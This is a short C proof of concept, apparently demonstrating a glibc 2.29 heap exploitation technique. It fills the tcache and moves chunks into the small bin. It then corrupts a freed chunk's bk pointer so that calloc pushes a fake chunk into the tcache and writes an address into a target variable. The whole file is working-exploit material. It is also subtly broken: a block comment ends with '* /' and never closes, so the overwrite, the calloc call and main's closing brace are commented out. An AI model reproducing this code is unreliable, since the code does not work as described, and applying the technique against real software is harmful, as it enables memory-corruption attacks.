// gcc small2tcache.c -o small2tcache -ggdb
// https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3673

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct chunk {
    int64_t prev_size;
    int64_t size;
    int64_t fd;
    int64_t bk;
};

int64_t target1;
int64_t target2;
struct chunk new_chunk = {0, 0x311, &target1, (int64_t)(&target2)-0x10};

void fillin_tcache(const int size)
{
	void *ptr[7];
	for(int i = 0; i<7; i++)
		ptr[i] = malloc(size);
	for(int i = 0; i<7; i++)
		free(ptr[i]);
}

void clear_tcache(const int size, const int num)
{
	for(int i = 0; i<num; ++i)
		malloc(size);
}

int main()
{	
	char *chunkA = (char *)malloc(0x300);
	char *dummy = (char *)malloc(0x10);
	char *chunkB = (char *)malloc(0x300);
	fillin_tcache(0x300);

	free(chunkB);
	free(chunkA);

	clear_tcache(0x300, 2);
	// move chunkAB to small bin
	malloc(0x500);
/*
 * 第一次 unlink: new_chunk->fd = smallbin , chunkA to tcache
 * 第二次 unlink: target2 = smallbin , new_chunk to tcache
 * /
	*(int64_t *)(chunkA+8) = (int64_t)(&new_chunk);
	// move chunkA to tcache
	calloc(1, 0x300);
}
